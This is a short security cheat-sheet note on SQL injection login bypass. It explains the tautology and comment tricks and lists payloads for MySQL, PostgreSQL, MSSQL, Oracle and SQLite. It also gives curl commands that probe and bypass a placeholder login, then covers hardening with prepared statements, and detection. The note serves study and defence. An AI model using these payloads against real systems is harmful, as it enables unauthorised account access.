---
topic: sqli-auth-bypass
tags: [web, sqli, authentication, bypass]
---

# SQLi in the login — bypassing authentication

**English** | [🇪🇸 Español](sqli-auth-bypass.md)

> Reusable note. Do not publish output containing real credentials.

## Idea

A vulnerable login concatenates username and password into a query. If the field is not parameterised, the input can close the string and turn the condition into a tautology, or comment out the rest of the query so the password check disappears.

```php
$q = "SELECT * FROM users WHERE username = '$u' AND password = '$p'";
```

With `u = admin` and `p = ' or '1'='1'#`:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' or '1'='1'#'';
```

- `' or '1'='1` closes the string and appends a tautology.
- `#` (MySQL/MariaDB) comments out the closing quote and the remaining check.
- The `SELECT` returns the first row and the app creates the session.

## Payloads per engine

| Engine | Payload | Note |
|---|---|---|
| MySQL / MariaDB | `' or '1'='1'#` | `#` comments to end of line |
| MySQL (no `#`) | `' or '1'='1'-- -` | The space after `--` is required |
| PostgreSQL | `' or '1'='1'--` | `--` comments the rest |
| MSSQL | `' or 1=1--` | `--` comments the rest |
| Oracle | `' or '1'='1'--` | Watch for `FROM dual` elsewhere |
| SQLite | `' or '1'='1'--` | Same as PostgreSQL |

Useful variants when the username must exist:

```text
admin'-- -
admin'#
' or 1=1 limit 1-- -
' or 'x'='x
```

## Quick check

```bash
# does the field leak engine errors?
curl -s -X POST http://<HOST>/login.php \
  -d "username=admin'&password=x" | grep -iE "sql|syntax|warning"

# bypass
curl -s -X POST http://<HOST>/login.php \
  --data-urlencode "username=admin" \
  --data-urlencode "password=' or '1'='1'#" -c cookies.txt
curl -s -b cookies.txt http://<HOST>/dashboard.php
```

Signs it worked: a `302` into a private area, a new session cookie, content only the administrator sees.

## When it is not SQLi

- **Type juggling**: `strcmp($_POST['password'], $hash)` with `password[]=x` returns `0` and PHP treats it as a match. No SQL involved.
- **Loose comparison**: `if ($row['password'] == $input)` with `0e`-prefixed hashes (magic hashes).
- **JWT or cookies**: the role travels client-side and is edited by hand (IDOR).

## Hardening

```php
$stmt = $pdo->prepare('SELECT id, password FROM users WHERE username = ?');
$stmt->execute([$username]);
$row = $stmt->fetch();
if ($row && password_verify($password, $row['password'])) { /* session */ }
```

- Prepared statements with bound parameters, never concatenation.
- `password_hash()`/`password_verify()` (bcrypt/argon2), not MD5/SHA1.
- Validate that parameters are scalars (`is_string`) before use.
- Least-privilege database user and SQL errors kept out of responses.
- MFA and attempt lockout as defence in depth.

## Detection

- Requests containing `'`, `"`, `--`, `#`, `OR 1=1` or `UNION` in login fields.
- Engine errors returned to the client or latency spikes on the database.
- A successful login with an empty password, a non-existent user or an odd length.
- Correlation: the same `User-Agent` trying several users within seconds.

## References

- <https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html>
- <https://portswigger.net/web-security/sql-injection>
- <https://owasp.org/www-community/attacks/SQL_Injection>
